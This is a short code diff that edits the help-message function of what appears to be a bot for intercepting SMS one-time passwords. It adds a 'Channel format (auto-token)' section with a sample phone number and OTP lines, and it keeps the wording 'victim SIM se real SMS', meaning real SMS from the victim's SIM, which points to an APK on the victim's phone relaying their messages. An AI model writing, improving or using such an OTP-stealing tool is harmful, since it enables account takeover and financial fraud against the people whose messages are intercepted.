@@ -529,10 +529,13 @@ def format_guide_message() -> str:
         "→ /mynum (ya /key+APK) → /addchannel\n"
         "→ /startmonitor"
         "</pre>\n\n"
-        "<b>Channel format</b>\n"
+        "<b>Channel format (auto-token)</b>\n"
         "<pre>"
+        "917290053434 | OTP message\n"
+        "To: 917290053434\n"
+        "Message: OTP text\n"
         "91XXXXXXXXXX message body\n"
-        "→ victim SIM se real SMS"
+        "→ victim SIM se real SMS (webhookEvent)"
         "</pre>"
     )
 
